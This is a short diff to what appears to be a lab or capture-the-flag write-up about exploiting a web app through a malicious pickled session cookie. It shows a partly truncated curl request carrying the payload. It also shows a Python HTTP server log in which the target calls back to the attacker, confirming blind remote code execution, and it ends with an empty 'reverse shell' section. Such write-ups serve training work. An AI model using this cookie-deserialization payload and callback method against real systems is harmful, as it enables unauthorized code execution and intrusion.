@@ -380,7 +380,22 @@ curl http://ctos.site/ -H 'Cookie: ctos_session=gAWVPQAAAAAAAACMBXBvc2l4lIwGc3lz
 Then ill send the request to the site using the malicious session
 
 ```python
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.200.88.158 - - [31/Aug/2026 16:08:42] code 404, message File not found
+10.200.88.158 - - [31/Aug/2026 16:08:42] "GET /test.txt HTTP/1.1" 404 -
+```
+
+I have blind RCE
+
+Now this is confirmed i can work on getting a reverse shell
+
+# Reverse shell on WEB-01
+
+```python
 
 ```
+
+
 
 
